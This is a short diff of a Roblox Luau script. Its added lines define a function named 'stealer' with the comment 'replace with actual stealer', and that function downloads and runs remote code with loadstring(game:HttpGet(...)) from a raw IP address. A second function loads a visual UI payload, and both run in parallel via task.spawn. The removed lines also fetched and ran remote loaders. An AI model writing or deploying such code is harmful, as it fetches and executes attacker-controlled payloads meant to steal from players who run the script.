@@ -1,3 +1,9 @@
-ID="7e7434ea-2db4-4205-a1a7-aea137d29e91";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
-loadstring(game:HttpGet("https://cdn.reverse.software/visual.luau"))()
+local function stealer()
+    ID="7e7434ea-2db4-4205-a1a7-aea137d29e91";
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+end
+task.spawn(stealer)
+task.spawn(loadui)
